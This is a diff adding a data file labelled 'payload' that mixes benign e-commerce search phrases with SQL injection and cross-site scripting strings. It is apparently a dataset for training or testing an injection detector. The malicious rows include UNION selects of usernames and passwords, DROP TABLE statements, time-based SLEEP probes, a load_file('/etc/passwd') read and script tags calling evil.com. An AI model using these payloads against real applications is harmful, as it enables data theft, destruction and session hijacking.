@@ -1,0 +1,119 @@
+payload
+search by brand
+' OR 1=1 --
+<svg onload=alert(1)>
+view dashboard
+' UNION SELECT username,password FROM users --
+add to cart
+<script>alert('XSS')</script>
+billing details
+" OR 1=1 --
+filter by price
+<img src=x onerror=alert(1)>
+admin' --
+recent purchases
+' OR SLEEP(5) --
+contact support
+<iframe src=javascript:alert(1)>
+order status
+' OR 1=1#
+<script>document.cookie</script>
+manage subscriptions
+logout user
+' OR database() --
+<video onerror=alert(1)></video>
+best selling items
+' OR 1=1 LIMIT 1 --
+privacy policy
+<img src=x onerror=confirm(1)>
+' OR 1=1; DROP TABLE users --
+track shipment
+<script>alert(document.URL)</script>
+update password
+' UNION SELECT NULL --
+add payment method
+<svg><script>alert(1)</script></svg>
+home page
+1 OR 1=1
+search product
+<iframe srcdoc="<script>alert(1)</script>">
+' OR user() --
+wishlist items
+apply discount code
+<img src=x onerror=alert(document.domain)>
+' OR BENCHMARK(1000000,MD5(1)) --
+edit profile
+<script>setTimeout('alert(1)',1000)</script>
+' OR 'a'='a
+view notifications
+search by keyword
+<svg onload=confirm(1)>
+' OR 1=1 ORDER BY 1 --
+help center
+<script>alert(1)</script>
+' OR @@version --
+checkout page
+1 OR SLEEP(5)
+about us
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+' OR 1=1 WAITFOR DELAY '00:00:05' --
+customer feedback
+<img src=x onerror=prompt(1)>
+' OR EXISTS(SELECT * FROM users) --
+browse categories
+dark mode toggle
+<script>eval('alert(1)')</script>
+search by category
+' OR extractvalue(1,concat(0x7e,database())) --
+download invoice
+<svg><set onbegin=alert(1) attributeName=x></svg>
+sign up account
+' OR load_file('/etc/passwd') --
+reset password
+<span onmouseover=alert(1)>Hover</span>
+' OR 1=1 GROUP BY username --
+account settings
+<script>prompt(1)</script>
+search by size
+'; DROP TABLE users --
+latest offers
+<img src=x onerror="this.src='http://evil.com'">
+' OR updatexml(1,concat(0x7e,user()),1) --
+forgot username
+' OR '1'='1
+upload profile picture
+<script>fetch('http://evil.com')</script>
+' OR CAST(version() AS INT) --
+view product details
+<details open ontoggle=alert(1)>
+' OR IF(1=1,SLEEP(5),0) --
+sort by rating
+1' AND '1'='2
+product comparison
+<svg onload=prompt(1)>
+' OR schema_name --
+search by color
+<script>confirm(1)</script>
+1' OR '1'='1
+terms and conditions
+<iframe onload=alert(1)>
+add shipping address
+" UNION SELECT NULL --
+' OR 1=1 AND 1=2 --
+change language
+<script>window.location='http://evil.com'</script>
+' OR 1=1 AND ''=''
+view transaction history
+' AND 1=1 --
+submit review
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+' OR 1=1 OFFSET 0 ROWS --
+user profile
+<video><source onerror="alert(1)">
+1 OR 1=1
+search by keyword
+' OR ''=''
+remove from cart
+<script>alert(document.referrer)</script>
+admin' OR '1'='1
+
